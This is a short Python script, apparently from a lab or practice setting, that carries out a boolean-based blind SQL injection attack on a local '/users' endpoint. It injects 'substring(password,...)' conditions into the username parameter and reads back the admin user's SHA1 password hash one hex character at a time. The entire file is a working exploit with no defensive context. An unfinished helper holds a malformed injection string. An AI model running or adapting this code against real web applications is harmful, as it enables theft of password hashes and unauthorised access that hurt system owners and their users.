import requests

BASE_URL = "http://localhost:8080/users"




def get_password_hash(username):
    response = requests.get(BASE_URL, params={"username": username + " AND password = '"})

    print("Status code:", response.status_code)
    print("Response JSON:", response.json())

HEXCHARS = "0123456789abcdef"

def probe(payload):
    resp = requests.get(BASE_URL, params={"username": payload})
    try:
        return resp.json().get("result") == "User exists"
    except:
        return False

def extract_hash(target_user):
    print(f"[+] Extracting password hash for user: {target_user}")
    recovered = ""

    for pos in range(1, 41):  # SHA1 = 40 chars
        for ch in HEXCHARS:

            payload = f"{target_user}' AND substring(password,{pos},1)='{ch}'-- "

            if probe(payload):
                recovered += ch
                print(f"[+] Position {pos}: {ch} → {recovered}")
                break

    return recovered

if __name__ == '__main__':
    username = "admin"
    extract_hash(username)